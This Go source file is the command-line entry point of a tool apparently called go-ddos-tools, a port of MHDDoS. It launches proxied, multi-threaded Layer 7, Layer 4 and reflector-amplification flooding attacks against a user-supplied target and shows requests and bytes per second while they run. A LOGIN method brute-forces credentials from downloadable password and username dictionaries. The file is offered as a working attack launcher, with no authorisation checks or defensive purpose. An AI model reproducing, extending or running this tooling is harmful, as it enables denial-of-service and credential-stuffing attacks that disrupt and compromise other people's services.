package cmd

import (
	"context"
	"flag"
	"fmt"

	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/go-ddos-tools/pkg/attacks"
	"github.com/go-ddos-tools/pkg/config"
	"github.com/go-ddos-tools/pkg/core"
	"github.com/go-ddos-tools/pkg/execution"
	"github.com/go-ddos-tools/pkg/methods"
	"github.com/go-ddos-tools/pkg/proxy"
	"github.com/go-ddos-tools/pkg/tools"
	"github.com/go-ddos-tools/pkg/ui"
	"github.com/go-ddos-tools/pkg/utils"
)

func Execute() {
	defer func() {
		if r := recover(); r != nil {
			ui.PrintError("Unexpected error: %v", r)
		}
	}()

	// Setup signal handling
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	if len(os.Args) < 2 {
		ui.PrintBanner()
		ui.PrintUsage()
		return
	}

	command := strings.ToUpper(os.Args[1])

	switch command {
	case "HELP", "-H", "--HELP":
		ui.PrintBanner()
		ui.PrintUsage()
	case "TOOLS":
		ui.PrintBanner()

		tools.RunConsole()
	case "STOP":

		tools.StopAllAttacks()
	case "VERSION", "-V", "--VERSION":
		ui.PrintBanner()
	case "METHODS":
		ui.PrintBanner()
		printMethods()
	case "DICT":
		ui.PrintBanner()
		handleDictCommand(os.Args[2:])
	default:
		if err := runAttack(os.Args[1:], sigChan); err != nil {
			ui.PrintError("%v", err)
			fmt.Println()
			printUsageHint()
			os.Exit(1)
		}
	}
}

func runAttack(args []string, sigChan chan os.Signal) error {
	if len(args) < 2 {
		return fmt.Errorf("insufficient arguments. Expected: <method> <target> [options...]")
	}

	fs := flag.NewFlagSet(args[0], flag.ContinueOnError)
	threads := fs.Int("threads", 100, "Number of threads")
	duration := fs.Int("duration", 60, "Duration of the attack in seconds")
	rpc := fs.Int("rpc", 100, "Requests per connection")
	proxyType := fs.Int("proxy-type", 5, "SOCKS proxy type (4 or 5)")
	proxyFile := fs.String("proxy-file", "proxies.txt", "Proxy file name")
	configFile := fs.String("config", "config.json", "Configuration file")
	userAgentsFile := fs.String("user-agents", "files/useragent.txt", "User agents file")
	referersFile := fs.String("referers", "files/referers.txt", "Referers file")
	reflectorsFile := fs.String("reflectors", "", "Reflectors file for amplification attacks")
	dataFile := fs.String("data", "", "Data file for LOGIN method (username:password)")
	usernameDict := fs.String("usernames", "", "Username dictionary file")
	passwordDict := fs.String("passwords", "", "Password dictionary file")
	downloadDict := fs.Bool("download-dict", false, "Auto-download password dictionary if not found")

	if err := fs.Parse(args[2:]); err != nil {
		return err
	}

	method := strings.ToUpper(args[0])
	target := args[1]

	if !methods.IsValidMethod(method) {
		suggestions := ui.SuggestMethod(method, methods.AllMethods)
		errMsg := fmt.Sprintf("invalid method: %s", method)
		if len(suggestions) > 0 {
			errMsg += fmt.Sprintf("\n  Did you mean: %s?", strings.Join(suggestions, ", "))
		}
		return fmt.Errorf("%s", errMsg)
	}

	if result := ui.ValidateThreads(*threads); !result.Valid {
		return fmt.Errorf("%s", ui.FormatValidationError(result, "Threads"))
	}
	if result := ui.ValidateDuration(*duration); !result.Valid {
		return fmt.Errorf("%s", ui.FormatValidationError(result, "Duration"))
	}
	if methods.IsLayer7Method(method) {
		if result := ui.ValidateRPC(*rpc); !result.Valid {
			return fmt.Errorf("%s", ui.FormatValidationError(result, "RPC"))
		}
		if result := ui.ValidateProxyType(*proxyType); !result.Valid {
			return fmt.Errorf("%s", ui.FormatValidationError(result, "Proxy Type"))
		}
		if result := ui.ValidateURL(target); !result.Valid {
			return fmt.Errorf("%s", ui.FormatValidationError(result, "Target URL"))
		}
	} else {
		if result := ui.ValidateHostPort(target); !result.Valid {
			return fmt.Errorf("%s", ui.FormatValidationError(result, "Target Host/Port"))
		}
	}

	// Load configuration
	cfg, err := config.LoadConfig(*configFile)
	if err != nil {
		ui.PrintWarning("Could not load %s, using defaults: %v", *configFile, err)
		cfg = &config.Config{
			MCBot:             "MHDDoS_",
			MinecraftProtocol: 47,
		}
	}

	// Normalize target URL
	if methods.IsLayer7Method(method) && !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}

	var proxies []proxy.Proxy
	var userAgents, referers, reflectors, credentials []string

	if methods.IsLayer7Method(method) {
		userAgents, _ = utils.LoadRequiredFile(*userAgentsFile, "user agent")
		referers, _ = utils.LoadRequiredFile(*referersFile, "referer")

		if *proxyFile != "" {
			proxies, _ = proxy.LoadOrDownloadProxies("files/proxies/"+*proxyFile, *proxyType, cfg, target, *threads)
		}

		if method == "LOGIN" {
			if *dataFile != "" {
				// Load credentials from file (username:password format)
				credentials, err = utils.LoadCredentialsFromFile(*dataFile)
				if err != nil {
					return err
				}
			} else if *usernameDict != "" || *passwordDict != "" {
				// Generate credentials from dictionary files
				var usernames, passwords []string

				if *usernameDict != "" {
					usernames, err = utils.LoadDictionary(*usernameDict)
					if err != nil {
						return fmt.Errorf("failed to load username dictionary: %w", err)
					}
				}

				if *passwordDict != "" {
					// Auto-download if requested and file doesn't exist
					if *downloadDict {
						// Try to auto-download from config
						// Extract dictionary name from path (e.g., "files/passwords-1k.txt" -> "passwords-1k")
						dictPath := *passwordDict
						if strings.HasPrefix(dictPath, "files/") {
							dictName := strings.TrimPrefix(dictPath, "files/")
							dictName = strings.TrimSuffix(dictName, ".txt")
							_ = utils.EnsureDictionaryFromConfig(cfg, dictName)
						}
					}

					passwords, err = utils.LoadDictionary(*passwordDict)
					if err != nil {
						return fmt.Errorf("failed to load password dictionary: %w", err)
					}
				}

				credentials = utils.GenerateCredentials(usernames, passwords)
				ui.PrintInfo("Generated %d credential combinations", len(credentials))
			} else {
				ui.PrintWarning("No credentials provided for LOGIN attack, using defaults")
				// Use default credentials
				credentials = utils.GenerateCredentials(nil, nil)
			}
		}
	} else if methods.IsLayer4Method(method) {
		if methods.IsAmplificationMethod(method) && *reflectorsFile != "" {
			reflectors, _ = utils.LoadLines("files/" + *reflectorsFile)
		}
	}

	attackCfg := &core.AttackConfig{
		Target:       target,
		Threads:      *threads,
		Duration:     *duration,
		RPC:          *rpc,
		Proxies:      proxies,
		UserAgents:   userAgents,
		Referers:     referers,
		Reflectors:   reflectors,
		Credentials:  credentials,
		ProtocolID:   cfg.MinecraftProtocol,
		RequestsSent: utils.NewCounter(),
		BytesSent:    utils.NewCounter(),
	}

	attacker := attacks.NewAttacker(method, attackCfg)
	if attacker == nil {
		return fmt.Errorf("unknown method implementation: %s", method)
	}

	// Start attack
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(*duration)*time.Second)
	defer cancel()

	// Handle signals to cancel context
	go func() {
		<-sigChan
		cancel()
	}()

	fmt.Println()
	ui.PrintInfo("Starting attack...")

	// Run attack in background
	go execution.RunAttack(ctx, attacker, *threads)

	// Monitor
	monitorAttack(ctx, *duration, method, target, attackCfg)

	return nil
}

func monitorAttack(ctx context.Context, duration int, method, target string, cfg *core.AttackConfig) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	startTime := time.Now()

	for {
		select {
		case <-ctx.Done():
			fmt.Println()
			ui.PrintSuccess("Attack finished")
			return
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			progress := (elapsed / float64(duration)) * 100
			if progress > 100 {
				progress = 100
			}

			reqs := cfg.RequestsSent.Get()
			bytes := cfg.BytesSent.Get()

			ui.ClearLine()
			fmt.Printf("  %s Target: %s | Method: %s | PPS: %s | BPS: %s %s",
				ui.Spinner(int(elapsed)),
				ui.FormatTarget(target),
				ui.FormatMethod(method),
				ui.FormatNumber(utils.HumanFormat(reqs)),
				ui.FormatNumber(utils.HumanBytes(bytes)),
				ui.ProgressBar(progress, 20))

			cfg.RequestsSent.Set(0)
			cfg.BytesSent.Set(0)
		}
	}
}

func printUsageHint() {
	fmt.Println("Run '" + os.Args[0] + " help' for usage.")
}

func printMethods() {
	l7 := []string{}
	l4 := []string{}
	amp := []string{}

	for _, m := range methods.AllMethods {
		if methods.IsLayer7Method(m) {
			l7 = append(l7, m)
		} else if methods.IsAmplificationMethod(m) {
			amp = append(amp, m)
		} else {
			l4 = append(l4, m)
		}
	}
	ui.PrintMethods(l7, l4, amp)
}

func handleDictCommand(args []string) {
	if len(args) == 0 {
		printDictUsage()
		return
	}

	subcommand := strings.ToLower(args[0])

	// Load config for dictionary providers
	cfg, err := config.LoadConfig("config.json")
	if err != nil {
		ui.PrintError("Failed to load config: %v", err)
		ui.PrintWarning("Cannot access dictionary providers without config.json")
		return
	}

	switch subcommand {
	case "download":
		if len(args) < 2 {
			ui.PrintError("Usage: dict download <type>")
			ui.PrintInfo("Available types:")
			for _, provider := range cfg.DictionaryProviders {
				ui.PrintInfo("  - %s", provider.Name)
			}
			return
		}

		dictType := strings.ToLower(args[1])

		if err := utils.DownloadDictionaryFromConfig(cfg, dictType); err != nil {
			ui.PrintError("Failed to download dictionary: %v", err)
			ui.PrintInfo("Available types:")
			for _, provider := range cfg.DictionaryProviders {
				ui.PrintInfo("  - %s", provider.Name)
			}
			return
		}

		provider := utils.GetDictionaryProvider(cfg, dictType)
		ui.PrintSuccess("Dictionary downloaded successfully to %s", provider.Filename)

	case "list":
		ui.PrintInfo("Available dictionaries:")
		fmt.Println()

		providers := utils.GetAllDictionaryProviders(cfg)
		if len(providers) == 0 {
			ui.PrintWarning("No dictionary providers configured in config.json")
			return
		}

		for _, provider := range providers {
			if _, err := os.Stat(provider.Filename); err == nil {
				lines, _ := utils.LoadDictionary(provider.Filename)
				ui.PrintSuccess("✓ %s (%d entries) - %s", provider.Name, len(lines), provider.Filename)
			} else {
				ui.PrintWarning("✗ %s - %s (not downloaded)", provider.Name, provider.Filename)
			}
		}

	default:
		printDictUsage()
	}
}

func printDictUsage() {
	fmt.Println()
	ui.PrintInfo("Dictionary Management Commands:")
	fmt.Println()
	fmt.Println("  dict download <type>    Download a password/username dictionary")
	fmt.Println("  dict list               List available dictionaries")
	fmt.Println()

	// Load config to show available types
	cfg, err := config.LoadConfig("config.json")
	if err == nil && len(cfg.DictionaryProviders) > 0 {
		ui.PrintInfo("Available dictionary types (from config.json):")
		fmt.Println()
		for _, provider := range cfg.DictionaryProviders {
			fmt.Printf("  %-20s %s\n", provider.Name, provider.Type)
		}
	} else {
		ui.PrintInfo("Available dictionary types:")
		fmt.Println()
		fmt.Println("  passwords-500           Top 500 worst passwords (fastest)")
		fmt.Println("  passwords-1k            Top 1,000 best passwords")
		fmt.Println("  passwords-10k           Top 10,000 most common passwords")
		fmt.Println("  usernames               Common usernames")
	}

	fmt.Println()
	ui.PrintInfo("Example:")
	fmt.Println()
	fmt.Println("  ./ddos-tools dict download passwords-10k")
	fmt.Println("  ./ddos-tools LOGIN http://example.com/api/login --passwords files/passwords-10k.txt")
	fmt.Println()
	ui.PrintInfo("Note: Dictionary URLs are configured in config.json")
	fmt.Println()
}
